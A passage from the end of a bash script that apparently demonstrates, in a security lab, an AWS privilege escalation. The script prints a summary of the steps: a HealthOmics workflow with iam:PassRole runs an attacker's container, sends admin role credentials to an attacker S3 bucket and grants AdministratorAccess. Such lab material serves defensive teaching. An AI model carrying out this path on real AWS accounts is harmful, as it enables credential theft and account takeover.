echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL! (Cross-Account Variant)${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, omics:CreateWorkflow, omics:StartRun)"
echo "2. Created attacker-controlled ECR repo ($ATTACKER_ECR_REPO_NAME) with omics pull policy"
echo "3. Pushed aws-cli container image from public ECR to attacker's private ECR"
echo "4. Created attacker-controlled S3 bucket ($ATTACKER_BUCKET_NAME) with public read/write policy"
echo "5. Created malicious WDL workflow definition referencing attacker ECR image"
echo "6. Started workflow run passing admin role ($ADMIN_ROLE_NAME) via iam:PassRole"
echo "7. Workflow task exfiltrated admin role credentials to attacker S3 bucket"
echo "8. Retrieved stolen credentials and used them to attach AdministratorAccess to $STARTING_USER"
echo "9. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  -> (omics:CreateWorkflow with attacker ECR image)"
echo "  -> (iam:PassRole + omics:StartRun with $ADMIN_ROLE_NAME)"
echo "  -> Workflow task exfiltrates admin creds to attacker S3 bucket"
echo "  -> Attacker retrieves creds -> (iam:AttachUserPolicy) -> Admin"

echo -e "\n${YELLOW}Cross-Account Detail:${NC}"
echo "  Victim Account:    $VICTIM_ACCOUNT_ID"
echo "  Attacker Account:  $ATTACKER_ACCOUNT_ID"
echo "  Attacker ECR Repo: $ATTACKER_ECR_REGISTRY/$ATTACKER_ECR_REPO_NAME"
echo "  Attacker Exfil Bucket: $ATTACKER_BUCKET_NAME"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- HealthOmics Workflow: $WORKFLOW_NAME (ID: $WORKFLOW_ID)"
echo "- Workflow Run ID: $RUN_ID"
echo "- Attacker ECR repo: $ATTACKER_ECR_REPO_NAME (will be deleted on exit)"
echo "- Attacker exfil bucket: $ATTACKER_BUCKET_NAME (will be deleted on exit)"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}Warning: The HealthOmics workflow is still deployed${NC}"
echo -e "${RED}Warning: AdministratorAccess is still attached to $STARTING_USER${NC}"
echo -e "${YELLOW}Note: Attacker ECR repo and S3 bucket will be cleaned up automatically on exit${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack_cross_account.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
